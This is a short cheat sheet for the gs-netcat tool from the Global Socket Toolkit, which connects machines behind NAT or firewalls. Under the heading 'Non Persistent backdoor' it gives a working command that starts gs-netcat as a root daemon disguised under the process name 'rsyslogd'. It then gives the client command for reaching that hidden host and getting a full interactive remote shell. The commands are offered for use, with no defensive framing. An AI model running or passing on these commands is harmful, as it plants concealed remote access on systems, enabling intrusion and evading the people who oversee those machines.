# gs-netcat

### Overview

The Global Socket Tookit allows two users behind NAT/Firewall to establish a TCP connection with each other. Securely.

More on [https://www.gsocket.io](https://www.gsocket.io).

### Non Persistent backdoor

```
$(GSOCKET_ARGS="-s MySecret -liqD" HOME=/root TERM=xterm-256color SHELL="/bin/bash" /bin/bash -c "cd $HOME; exec -a rsyslogd /path/to/gs-netcat")
```

### Client Connection

```
gs-netcat -i -s MySecret
```

* Above will spawn a full pty giving you the option to tab complete and use up arrow as long as CTRL+C
